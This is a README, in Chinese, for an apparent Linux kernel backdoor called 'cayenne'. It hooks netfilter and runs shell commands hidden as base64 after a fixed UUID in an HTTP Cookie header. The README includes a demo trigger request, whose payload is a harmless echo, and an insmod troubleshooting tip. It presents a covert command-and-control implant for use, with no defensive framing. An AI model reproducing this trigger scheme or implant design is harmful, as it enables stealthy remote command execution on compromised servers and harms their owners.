# cayenne
通过HTTP请求中的某一约定字段做C2控制，内核层通过netfilter监听并执行命令
## 内核
LINUX 4.15.0-143-generic  
## DEMO
```
GET / HTTP/1.1
Host: 192.168.122.136
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
cookie: 91d1c532-b156-11eb-8e2c-dfb994043297;ZWNobyAxID4gL3RtcC8xMjM0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.51
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
```
cookie后半部分是base64编码的shell命令，目前的实现没有做回显（这个需要实现一个专用客户端，封装一个上层协议，暂未实现）
## FAQ
如遇错误
```
cayenne: Unknown symbol __nf_nat_mangle_tcp_packet (err -2)
```
先执行如下语句后再重试insmod  
```
sudo iptables -t nat --list
```